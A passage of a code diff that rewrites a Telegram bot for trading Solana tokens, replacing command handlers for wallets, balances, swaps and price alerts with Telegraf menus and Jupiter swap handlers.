-bot.onText(/\/referrals/, async (msg) => {
-  const chatId = msg.chat.id;
-  await bot.sendMessage(chatId, `
-🎁 *Referral Program*
-
-Invite friends and earn rewards!
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Generate your unique referral link
-• Track referral signups
-• Earn commission on trades
-• Withdraw referral earnings
-
-Stay tuned for updates!
-  `, { 
-    parse_mode: 'Markdown',
-    reply_markup: {
-      inline_keyboard: [[{ text: '🔙 Back to Menu', callback_data: 'main_menu' }]],
-    },
-  });
-});
-
-bot.onText(/\/wallet/, async (msg) => {
-  const chatId = msg.chat.id;
-  await bot.sendMessage(chatId, '💰 *Wallet Management*', {
-    parse_mode: 'Markdown',
-    ...walletMenuKeyboard,
-  });
-});
-
-bot.onText(/\/balance/, async (msg) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
   
-  if (!user.activeWallet) {
-    await bot.sendMessage(chatId, '❌ No active wallet. Create or import one first.', walletMenuKeyboard);
-    return;
-  }
-
-  await bot.sendMessage(chatId, '⏳ Fetching balance...');
-  
-  const balance = await getWalletBalance(user.activeWallet.publicKey);
-  
-  await bot.sendMessage(chatId, `
-💰 *Wallet Balance*
-
-Address: \`${shortenAddress(user.activeWallet.publicKey, 6)}\`
-Balance: *${formatSOL(balance)} SOL*
-  `, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/portfolio/, async (msg) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  if (!user.activeWallet) {
-    await bot.sendMessage(chatId, '❌ No active wallet. Create or import one first.');
-    return;
-  }
-
-  await bot.sendMessage(chatId, '⏳ Fetching portfolio...');
-  
-  const [solBalance, tokenAccounts] = await Promise.all([
-    getWalletBalance(user.activeWallet.publicKey),
-    getTokenAccounts(user.activeWallet.publicKey),
+  const keyboard = Markup.inlineKeyboard([
+    [Markup.button.callback('🔄 Refresh', 'refresh_positions')],
+    [Markup.button.callback('« Back', 'back_main')]
   ]);
-
-  let portfolioMsg = `
-📊 *Portfolio*
-
-*SOL Balance:* ${formatSOL(solBalance)} SOL
-
-*Token Holdings:*
-`;
-
-  if (tokenAccounts.length === 0) {
-    portfolioMsg += '\nNo token holdings found.';
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
   } else {
-    for (const token of tokenAccounts.slice(0, 10)) {
-      const tokenInfo = await getTokenInfo(token.mint);
-      const price = await getTokenPrice(token.mint);
-      const value = price ? (token.balance * price).toFixed(2) : 'N/A';
-      
-      portfolioMsg += `\n• *${tokenInfo?.symbol || shortenAddress(token.mint)}*`;
-      portfolioMsg += `\n  Balance: ${formatNumber(token.balance)}`;
-      portfolioMsg += `\n  Value: $${value}\n`;
-    }
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
   }
-
-  await bot.sendMessage(chatId, portfolioMsg, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/price (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const tokenInput = match[1].trim();
-  
-  await bot.sendMessage(chatId, '⏳ Fetching price...');
-  
-  const tokenInfo = await getTokenInfo(tokenInput);
-  const price = await getTokenPrice(tokenInput);
-  
-  if (!price) {
-    await bot.sendMessage(chatId, '❌ Could not fetch price. Check the token address.');
-    return;
-  }
-
-  await bot.sendMessage(chatId, `
-📈 *Price Check*
-
-Token: *${tokenInfo?.name || 'Unknown'}* (${tokenInfo?.symbol || 'N/A'})
-Address: \`${shortenAddress(tokenInput, 6)}\`
-Price: *$${formatNumber(price, 8)}*
-  `, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/buy (.+) (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  if (!user.activeWallet) {
-    await bot.sendMessage(chatId, '❌ No active wallet. Create or import one first.');
-    return;
-  }
-
-  const tokenMint = match[1].trim();
-  const amountSOL = parseFloat(match[2]);
-  
-  if (isNaN(amountSOL) || amountSOL <= 0) {
-    await bot.sendMessage(chatId, '❌ Invalid amount. Usage: /buy <token_address> <sol_amount>');
-    return;
-  }
-
-  await bot.sendMessage(chatId, '⏳ Getting quote...');
-  
-  const amountLamports = Math.floor(amountSOL * LAMPORTS_PER_SOL);
-  const quote = await getSwapQuote(WSOL_MINT, tokenMint, amountLamports, user.settings.slippageBps);
-  
-  if (!quote || quote.error) {
-    await bot.sendMessage(chatId, `❌ Could not get quote: ${quote?.error || 'Unknown error'}`);
-    return;
-  }
-
-  const tokenInfo = await getTokenInfo(tokenMint);
-  const outAmount = quote.outAmount / Math.pow(10, tokenInfo?.decimals || 9);
-  
-  const confirmMsg = `
-🔄 *Swap Confirmation*
-
-*Selling:* ${amountSOL} SOL
-*Buying:* ~${formatNumber(outAmount)} ${tokenInfo?.symbol || 'tokens'}
-*Slippage:* ${user.settings.slippageBps / 100}%
-*Price Impact:* ${quote.priceImpactPct || 'N/A'}%
-
-Reply with /confirm_buy to execute
-  `;
-
-  user.pendingSwap = { quote, type: 'buy', tokenMint };
-  
-  await bot.sendMessage(chatId, confirmMsg, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/confirm_buy/, async (msg) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  if (!user.pendingSwap || user.pendingSwap.type !== 'buy') {
-    await bot.sendMessage(chatId, '❌ No pending buy order. Use /buy first.');
-    return;
-  }
-
-  await bot.sendMessage(chatId, '⏳ Executing swap...');
-  
-  const result = await executeSwap(user.activeWallet, user.pendingSwap.quote);
-  user.pendingSwap = null;
-  
-  if (result.success) {
-    await bot.sendMessage(chatId, `
-✅ *Swap Successful!*
-
-Transaction: [View on Solscan](${result.explorerUrl})
-    `, { parse_mode: 'Markdown', disable_web_page_preview: true });
-  } else {
-    await bot.sendMessage(chatId, `❌ Swap failed: ${result.error}`);
-  }
-});
-
-bot.onText(/\/sell (.+) (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  if (!user.activeWallet) {
-    await bot.sendMessage(chatId, '❌ No active wallet. Create or import one first.');
-    return;
-  }
-
-  const tokenMint = match[1].trim();
-  const amountTokens = parseFloat(match[2]);
-  
-  if (isNaN(amountTokens) || amountTokens <= 0) {
-    await bot.sendMessage(chatId, '❌ Invalid amount. Usage: /sell <token_address> <token_amount>');
-    return;
-  }
-
-  const tokenInfo = await getTokenInfo(tokenMint);
-  const decimals = tokenInfo?.decimals || 9;
-  
-  await bot.sendMessage(chatId, '⏳ Getting quote...');
-  
-  const amountRaw = Math.floor(amountTokens * Math.pow(10, decimals));
-  const quote = await getSwapQuote(tokenMint, WSOL_MINT, amountRaw, user.settings.slippageBps);
-  
-  if (!quote || quote.error) {
-    await bot.sendMessage(chatId, `❌ Could not get quote: ${quote?.error || 'Unknown error'}`);
-    return;
-  }
-
-  const outAmountSOL = quote.outAmount / LAMPORTS_PER_SOL;
-  
-  const confirmMsg = `
-🔄 *Swap Confirmation*
-
-*Selling:* ${formatNumber(amountTokens)} ${tokenInfo?.symbol || 'tokens'}
-*Receiving:* ~${formatNumber(outAmountSOL)} SOL
-*Slippage:* ${user.settings.slippageBps / 100}%
-*Price Impact:* ${quote.priceImpactPct || 'N/A'}%
-
-Reply with /confirm_sell to execute
-  `;
-
-  user.pendingSwap = { quote, type: 'sell', tokenMint };
-  
-  await bot.sendMessage(chatId, confirmMsg, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/confirm_sell/, async (msg) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  if (!user.pendingSwap || user.pendingSwap.type !== 'sell') {
-    await bot.sendMessage(chatId, '❌ No pending sell order. Use /sell first.');
-    return;
-  }
-
-  await bot.sendMessage(chatId, '⏳ Executing swap...');
-  
-  const result = await executeSwap(user.activeWallet, user.pendingSwap.quote);
-  user.pendingSwap = null;
-  
-  if (result.success) {
-    await bot.sendMessage(chatId, `
-✅ *Swap Successful!*
-
-Transaction: [View on Solscan](${result.explorerUrl})
-    `, { parse_mode: 'Markdown', disable_web_page_preview: true });
-  } else {
-    await bot.sendMessage(chatId, `❌ Swap failed: ${result.error}`);
-  }
-});
-
-bot.onText(/\/alert (.+) (.+) (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const tokenMint = match[1].trim();
-  const targetPrice = parseFloat(match[2]);
-  const direction = match[3].toLowerCase();
-  
-  if (isNaN(targetPrice) || targetPrice <= 0) {
-    await bot.sendMessage(chatId, '❌ Invalid price.');
-    return;
-  }
-  
-  if (!['above', 'below'].includes(direction)) {
-    await bot.sendMessage(chatId, '❌ Direction must be "above" or "below".');
-    return;
-  }
-
-  const alertId = state.addAlert(chatId, tokenMint, targetPrice, direction);
-  const tokenInfo = await getTokenInfo(tokenMint);
-  
-  await bot.sendMessage(chatId, `
-🔔 *Alert Created*
-
-ID: #${alertId}
-Token: ${tokenInfo?.symbol || shortenAddress(tokenMint)}
-Trigger: Price goes *${direction}* $${formatNumber(targetPrice, 8)}
-  `, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/alerts/, async (msg) => {
-  const chatId = msg.chat.id;
-  const alerts = state.getUserAlerts(chatId);
-  
-  if (alerts.length === 0) {
-    await bot.sendMessage(chatId, '📭 No active alerts.', alertsMenuKeyboard);
-    return;
-  }
-
-  let alertsMsg = '🔔 *Your Alerts*\n\n';
-  
-  for (const alert of alerts) {
-    const tokenInfo = await getTokenInfo(alert.tokenMint);
-    alertsMsg += `*#${alert.id}* - ${tokenInfo?.symbol || shortenAddress(alert.tokenMint)}\n`;
-    alertsMsg += `  ${alert.direction === 'above' ? '📈' : '📉'} ${alert.direction} $${formatNumber(alert.targetPrice, 8)}\n\n`;
-  }
-  
-  alertsMsg += '\nUse /removealert <id> to remove an alert.';
-  
-  await bot.sendMessage(chatId, alertsMsg, { parse_mode: 'Markdown' });
-});
-
-bot.onText(/\/removealert (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const alertId = parseInt(match[1]);
-  
-  const alert = state.priceAlerts.get(alertId);
-  
-  if (!alert || alert.chatId !== chatId) {
-    await bot.sendMessage(chatId, '❌ Alert not found.');
-    return;
-  }
-  
-  state.removeAlert(alertId);
-  await bot.sendMessage(chatId, `✅ Alert #${alertId} removed.`);
-});
-
-bot.onText(/\/slippage (.+)/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  const slippageBps = parseInt(match[1]);
-  
-  if (isNaN(slippageBps) || slippageBps < 1 || slippageBps > 5000) {
-    await bot.sendMessage(chatId, '❌ Slippage must be between 1-5000 bps (0.01% - 50%)');
-    return;
-  }
-  
-  user.settings.slippageBps = slippageBps;
-  await bot.sendMessage(chatId, `✅ Slippage set to ${slippageBps / 100}%`);
-});
-
-bot.onText(/\/settings/, async (msg) => {
-  const chatId = msg.chat.id;
-  const user = state.getUser(chatId);
-  
-  await bot.sendMessage(chatId, `
-⚙️ *Current Settings*
-
-Slippage: ${user.settings.slippageBps / 100}%
-Notifications: ${user.settings.notifications ? 'Enabled' : 'Disabled'}
-Active Wallet: ${user.activeWallet ? shortenAddress(user.activeWallet.publicKey) : 'None'}
-
-*Commands:*
-/slippage <bps> - Change slippage
-  `, { parse_mode: 'Markdown' });
-});
+}
 
 // ============================================
-// CALLBACK QUERY HANDLERS
+// BUY MENU
 // ============================================
-bot.on('callback_query', async (query) => {
-  const chatId = query.message.chat.id;
-  const messageId = query.message.message_id;
-  const data = query.data;
-  const user = state.getUser(chatId);
+async function showBuyMenu(ctx, edit = false) {
+  const message = `
+🟢 *Quick Buy*
 
-  await bot.answerCallbackQuery(query.id);
+Paste a token address or use /buy [amount] [address]
 
-  switch (data) {
-    case 'main_menu':
-    case 'refresh_main': {
-      const menuMessage = await buildMainMenuMessage(chatId);
-      await bot.editMessageText(menuMessage, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        ...mainMenuKeyboard,
-      });
-      break;
+*Quick amounts:*
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [
+      Markup.button.callback('0.1 SOL', 'setbuy_0.1'),
+      Markup.button.callback('0.5 SOL', 'setbuy_0.5'),
+      Markup.button.callback('1 SOL', 'setbuy_1')
+    ],
+    [
+      Markup.button.callback('2 SOL', 'setbuy_2'),
+      Markup.button.callback('5 SOL', 'setbuy_5')
+    ],
+    [Markup.button.callback('« Back', 'back_main')]
+  ]);
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
+}
+
+// ============================================
+// SELL MENU
+// ============================================
+async function showSellMenu(ctx, edit = false) {
+  const message = `
+🔴 *Quick Sell*
+
+Select a percentage or use /sell [%] [address]
+
+*Quick percentages:*
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [
+      Markup.button.callback('25%', 'setsell_25'),
+      Markup.button.callback('50%', 'setsell_50')
+    ],
+    [
+      Markup.button.callback('75%', 'setsell_75'),
+      Markup.button.callback('100%', 'setsell_100')
+    ],
+    [Markup.button.callback('« Back', 'back_main')]
+  ]);
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
+}
+
+// ============================================
+// COPY TRADE MENU
+// ============================================
+async function showCopyTradeMenu(ctx, edit = false) {
+  const session = getSession(ctx.from.id);
+  
+  const message = `
+👥 *Copy Trade*
+
+Follow successful traders automatically.
+
+${session.copyTradeWallets.length > 0 
+  ? '*Tracking:*\n' + session.copyTradeWallets.map(w => `• \`${shortenAddress(w)}\``).join('\n')
+  : '_No wallets being tracked_'}
+
+Send a wallet address to start copy trading.
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [Markup.button.callback('➕ Add Wallet', 'copytrade_add')],
+    [Markup.button.callback('📋 Manage Wallets', 'copytrade_manage')],
+    [Markup.button.callback('« Back', 'back_main')]
+  ]);
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
+}
+
+// ============================================
+// LIMIT ORDER MENU
+// ============================================
+async function showLimitOrderMenu(ctx, edit = false) {
+  const session = getSession(ctx.from.id);
+  
+  const message = `
+📈 *Limit Orders*
+
+Set buy/sell triggers at specific prices.
+
+${session.limitOrders.length > 0 
+  ? '*Active Orders:*\n' + session.limitOrders.map((o, i) => 
+      `${i+1}. ${o.type} ${o.amount} @ $${o.price}`
+    ).join('\n')
+  : '_No active orders_'}
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [
+      Markup.button.callback('🟢 Limit Buy', 'limit_buy'),
+      Markup.button.callback('🔴 Limit Sell', 'limit_sell')
+    ],
+    [Markup.button.callback('📋 View Orders', 'limit_view')],
+    [Markup.button.callback('« Back', 'back_main')]
+  ]);
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
+}
+
+// ============================================
+// SETTINGS MENU
+// ============================================
+async function showSettings(ctx, edit = false) {
+  const session = getSession(ctx.from.id);
+  const { slippage, priorityFee, notifications } = session.settings;
+  
+  const message = `
+⚙️ *Settings*
+
+📊 *Slippage:* ${slippage}%
+⚡ *Priority Fee:* ${priorityFee} SOL
+🔔 *Notifications:* ${notifications ? 'ON' : 'OFF'}
+  `;
+  
+  const keyboard = Markup.inlineKeyboard([
+    [
+      Markup.button.callback(`Slippage: ${slippage}%`, 'settings_slippage'),
+      Markup.button.callback(`Fee: ${priorityFee}`, 'settings_fee')
+    ],
+    [
+      Markup.button.callback(
+        notifications ? '🔔 Notifs: ON' : '🔕 Notifs: OFF',
+        'settings_notifications'
+      )
+    ],
+    [Markup.button.callback('« Back', 'back_main')]
+  ]);
+  
+  if (edit) {
+    await ctx.editMessageText(message, { parse_mode: 'Markdown', ...keyboard });
+  } else {
+    await ctx.reply(message, { parse_mode: 'Markdown', ...keyboard });
+  }
+}
+
+// ============================================
+// TRADE HANDLERS
+// ============================================
+async function handleBuy(ctx, amount, address) {
+  const session = getSession(ctx.from.id);
+  
+  if (!session.wallet) {
+    await ctx.reply('❌ Please connect a wallet first.');
+    return;
+  }
+  
+  const loadingMsg = await ctx.reply(`
+🔄 *Processing Buy*
+
+Amount: ${amount} SOL
+Token: \`${shortenAddress(address)}\`
+Slippage: ${session.settings.slippage}%
+
+_Getting quote from Jupiter v6..._
+  `, { parse_mode: 'Markdown' });
+  
+  try {
+    // Check balance
+    const balance = await getBalance(session.wallet.publicKey);
+    if (balance < amount + 0.01) {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        loadingMsg.message_id,
+        null,
+        `❌ Insufficient balance!\n\nRequired: ${amount + 0.01} SOL\nAvailable: ${balance.toFixed(4)} SOL`,
+        { parse_mode: 'Markdown' }
+      );
+      return;
     }
     
-    case 'trade':
-      await bot.editMessageText(`
-⚡️ *Trade Tokens*
-
-Select your trading action:
-
-🔄 *Buy* - Purchase tokens with SOL
-💸 *Sell* - Sell tokens for SOL
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: '🔄 Buy', callback_data: 'buy' },
-              { text: '💸 Sell', callback_data: 'sell' },
-            ],
-            [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }],
-          ],
-        },
-      });
-      break;
+    // Convert SOL amount to lamports
+    const amountLamports = Math.floor(amount * LAMPORTS_PER_SOL);
+    const slippageBps = session.settings.slippage * 100; // Convert percentage to basis points
     
-    case 'dca_manager':
-      await bot.editMessageText(`
-📈 *DCA Manager*
-
-Dollar Cost Averaging allows you to automatically invest a fixed amount at regular intervals.
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Set up recurring buys
-• Choose interval (hourly, daily, weekly)
-• Select tokens and amounts
-• Track DCA performance
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }],
-          ],
-        },
-      });
-      break;
+    // Get quote from Jupiter
+    const quote = await getJupiterQuote(
+      NATIVE_SOL_MINT, // Input: SOL
+      address,          // Output: Token
+      amountLamports,
+      slippageBps
+    );
     
-    case 'limit_orders':
-      await bot.editMessageText(`
-🎯 *Limit Orders*
-
-Set buy or sell orders at your target prices.
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Create buy limit orders
-• Create sell limit orders
-• Set expiration times
-• View and cancel pending orders
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }],
-          ],
-        },
-      });
-      break;
-    
-    case 'copy_trading':
-      await bot.editMessageText(`
-👥 *Copy Trading*
-
-Follow successful traders and automatically mirror their trades.
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Browse top performing traders
-• Follow traders automatically
-• Set copy amounts and limits
-• Track copy trading performance
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }],
-          ],
-        },
-      });
-      break;
-    
-    case 'referrals':
-      await bot.editMessageText(`
-🎁 *Referral Program*
-
-Invite friends and earn rewards!
-
-🚧 *Coming Soon!*
-
-This feature is under development. You will be able to:
-• Generate your unique referral link
-• Track referral signups
-• Earn commission on trades
-• Withdraw referral earnings
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        reply_markup: {
-          inline_keyboard: [
-            [{ text: '🔙 Back to Menu', callback_data: 'main_menu' }],
-          ],
-        },
-      });
-      break;
-
-    case 'wallet':
-      await bot.editMessageText('💰 *Wallet Management*\n\nManage your Solana wallets:', {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-        ...walletMenuKeyboard,
-      });
-      break;
-
-    case 'wallet_create':
-      const newWallet = generateWallet();
-      user.wallets.push(newWallet);
-      user.activeWallet = newWallet;
-      
-      await bot.editMessageText(`
-✅ *New Wallet Created!*
-
-Address: \`${newWallet.publicKey}\`
-
-⚠️ *SAVE YOUR PRIVATE KEY:*
-\`${newWallet.privateKey}\`
-
-_Store this securely. It won't be shown again._
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
-        parse_mode: 'Markdown',
-      });
-      
-      await sleep(500);
-      await bot.sendMessage(chatId, '💰 Wallet Menu', walletMenuKeyboard);
-      break;
-
-    case 'wallet_import':
-      user.awaitingInput = 'wallet_import';
-      await bot.editMessageText(
-        '📥 *Import Wallet*\n\nSend your private key (base58 encoded):\n\n⚠️ _Make sure to use this bot in a private chat!_',
-        {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'Markdown',
-        }
+    if (!quote || !quote.outAmount) {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        loadingMsg.message_id,
+        null,
+        '❌ Could not get quote. Token may have no liquidity.',
+        { parse_mode: 'Markdown' }
       );
-      break;
+      return;
+    }
+    
+    // Calculate expected output
+    const expectedOutput = parseInt(quote.outAmount);
+    const priceImpact = parseFloat(quote.priceImpactPct || 0);
+    
+    // Update message with quote info
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `🔄 *Executing Swap*
 
-    case 'wallet_balance':
-      if (!user.activeWallet) {
-        await bot.sendMessage(chatId, '❌ No active wallet. Create or import one first.');
-        break;
+💰 Swapping: ${amount} SOL
+📊 Price Impact: ${priceImpact.toFixed(2)}%
+⚡ Priority Fee: ${session.settings.priorityFee} SOL
+
+_Signing and sending transaction..._`,
+      { parse_mode: 'Markdown' }
+    );
+    
+    // Execute the swap
+    const priorityFeeLamports = Math.floor(session.settings.priorityFee * LAMPORTS_PER_SOL);
+    const txid = await executeJupiterSwap(
+      quote,
+      new PublicKey(session.wallet.publicKey),
+      session.wallet.keypair,
+      priorityFeeLamports
+    );
+    
+    // Success message
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `✅ *Buy Successful!*
+
+💰 Spent: ${amount} SOL
+🎯 Token: \`${shortenAddress(address)}\`
+📊 Price Impact: ${priceImpact.toFixed(2)}%
+
+🔗 [View Transaction](https://solscan.io/tx/${txid})`,
+      {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+          [Markup.button.url('🔍 View on Solscan', `https://solscan.io/tx/${txid}`)],
+          [Markup.button.callback('🔄 Buy More', `refresh_${address}`)],
+          [Markup.button.callback('🏠 Menu', 'back_main')]
+        ])
       }
-      
-      const balance = await getWalletBalance(user.activeWallet.publicKey);
-      await bot.editMessageText(`
-💰 *Wallet Balance*
+    );
+    
+  } catch (error) {
+    console.error('Buy error:', error);
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `❌ *Buy Failed*
 
-Address: \`${shortenAddress(user.activeWallet.publicKey, 6)}\`
-Balance: *${formatSOL(balance)} SOL*
-      `, {
-        chat_id: chatId,
-        message_id: messageId,
+Error: ${error.message || 'Unknown error'}
+
+Please try again or adjust slippage.`,
+      {
         parse_mode: 'Markdown',
-        ...walletMenuKeyboard,
-      });
-      break;
-
-    case 'wallet_list':
-      if (user.wallets.length === 0) {
-        await bot.sendMessage(chatId, '📭 No wallets. Create or import one.', walletMenuKeyboard);
-        break;
+        ...Markup.inlineKeyboard([
+          [Markup.button.callback('⚙️ Settings', 'menu_settings')],
+          [Markup.button.callback('🔄 Try Again', `buy_${amount}_${address}`)],
+          [Markup.button.callback('🏠 Menu', 'back_main')]
+        ])
       }
-      
-      let walletsMsg = '📋 *Your Wallets*\n\n';
-      for (let i = 0; i < user.wallets.length; i++) {
-        const w = user.wallets[i];
-        const isActive = user.activeWallet?.publicKey === w.publicKey;
-        const bal = await getWalletBalance(w.publicKey);
-        walletsMsg += `${isActive ? '✅' : '◻️'} *${i + 1}.* \`${shortenAddress(w.publicKey)}\`\n`;
-        walletsMsg += `   Balance: ${formatSOL(bal)} SOL\n\n`;
+    );
+  }
+}
+
+async function handleSell(ctx, percentage, address) {
+  const session = getSession(ctx.from.id);
+  
+  if (!session.wallet) {
+    await ctx.reply('❌ Please connect a wallet first.');
+    return;
+  }
+  
+  const loadingMsg = await ctx.reply(`
+🔄 *Processing Sell*
+
+Selling: ${percentage}%
+Token: \`${shortenAddress(address)}\`
+Slippage: ${session.settings.slippage}%
+
+_Checking token balance..._
+  `, { parse_mode: 'Markdown' });
+  
+  try {
+    // Get token balance
+    const tokenBalance = await getTokenBalance(session.wallet.publicKey, address);
+    
+    if (tokenBalance.balance === 0) {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        loadingMsg.message_id,
+        null,
+        `❌ No tokens to sell!\n\nYou don't have any of this token in your wallet.`,
+        { parse_mode: 'Markdown' }
+      );
+      return;
+    }
+    
+    // Calculate amount to sell based on percentage
+    const sellAmount = Math.floor((tokenBalance.balance * percentage) / 100);
+    
+    if (sellAmount === 0) {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        loadingMsg.message_id,
+        null,
+        `❌ Sell amount too small!\n\nBalance: ${tokenBalance.uiAmount?.toFixed(4) || 0} tokens`,
+        { parse_mode: 'Markdown' }
+      );
+      return;
+    }
+    
+    const slippageBps = session.settings.slippage * 100; // Convert percentage to basis points
+    
+    // Update message
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `🔄 *Getting Quote*
+
+📊 Selling: ${percentage}% (${tokenBalance.uiAmount?.toFixed(4) || sellAmount} tokens)
+Token: \`${shortenAddress(address)}\`
+
+_Getting quote from Jupiter v6..._`,
+      { parse_mode: 'Markdown' }
+    );
+    
+    // Get quote from Jupiter
+    const quote = await getJupiterQuote(
+      address,           // Input: Token
+      NATIVE_SOL_MINT,   // Output: SOL
+      sellAmount,
+      slippageBps
+    );
+    
+    if (!quote || !quote.outAmount) {
+      await ctx.telegram.editMessageText(
+        ctx.chat.id,
+        loadingMsg.message_id,
+        null,
+        '❌ Could not get quote. Token may have no liquidity.',
+        { parse_mode: 'Markdown' }
+      );
+      return;
+    }
+    
+    // Calculate expected SOL output
+    const expectedSol = parseInt(quote.outAmount) / LAMPORTS_PER_SOL;
+    const priceImpact = parseFloat(quote.priceImpactPct || 0);
+    
+    // Update message with quote info
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `🔄 *Executing Swap*
+
+🔴 Selling: ${percentage}% of holdings
+💰 Expected: ~${expectedSol.toFixed(4)} SOL
+📊 Price Impact: ${priceImpact.toFixed(2)}%
+⚡ Priority Fee: ${session.settings.priorityFee} SOL
+
+_Signing and sending transaction..._`,
+      { parse_mode: 'Markdown' }
+    );
+    
+    // Execute the swap
+    const priorityFeeLamports = Math.floor(session.settings.priorityFee * LAMPORTS_PER_SOL);
+    const txid = await executeJupiterSwap(
+      quote,
+      new PublicKey(session.wallet.publicKey),
+      session.wallet.keypair,
+      priorityFeeLamports
+    );
+    
+    // Success message
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `✅ *Sell Successful!*
+
+🔴 Sold: ${percentage}% of holdings
+💰 Received: ~${expectedSol.toFixed(4)} SOL
+📊 Price Impact: ${priceImpact.toFixed(2)}%
+
+🔗 [View Transaction](https://solscan.io/tx/${txid})`,
+      {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([
+          [Markup.button.url('🔍 View on Solscan', `https://solscan.io/tx/${txid}`)],
+          [Markup.button.callback('🔄 Sell More', `refresh_${address}`)],
+          [Markup.button.callback('🏠 Menu', 'back_main')]
+        ])
       }
-      
-      await bot.editMessageText(walletsMsg, {
-        chat_id: chatId,
-        message_id: messageId,
+    );
+    
+  } catch (error) {
+    console.error('Sell error:', error);
+    await ctx.telegram.editMessageText(
+      ctx.chat.id,
+      loadingMsg.message_id,
+      null,
+      `❌ *Sell Failed*
+
+Error: ${error.message || 'Unknown error'}
+
+Please try again or adjust slippage.`,
+      {
         parse_mode: 'Markdown',
-        ...walletMenuKeyboard,
-      });
-      break;
+        ...Markup.inlineKeyboard([
+          [Markup.button.callback('⚙️ Settings', 'menu_settings')],
+          [Markup.button.callback('🔄 Try Again', `sell_${percentage}_${address}`)],
+          [Markup.button.callback('🏠 Menu', 'back_main')]
+        ])
+      }
+    );
+  }
+}
 
-    case 'portfolio':
-      bot.emit('text', { ...query.message, text: '/portfolio' });
-      break;
+// ============================================
+// CALLBACK HANDLERS
+// ============================================
 
-    case 'buy':
-      await bot.editMessageText(
-        '🔄 *Buy Tokens*\n\nUse command:\n`/buy <token_address> <sol_amount>`\n\nExample:\n`/buy EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v 0.1`',
-        {
-          chat_id: chatId,
-          message_id: messageId,
-          parse_mode: 'Markdown',
-          reply_markup: {
-            inline_keyboard: [[{ text: '🔙 Back', callback_data: 'trade' }]],
-          },
-        }
-      );
-      break;
+bot.action('back_main', async (ctx) => {
+  await ctx.answerCbQuery();
+  await showMainMenu(ctx, true);
+});
 
-    case 'sell':
-      await bot.editMessageText(
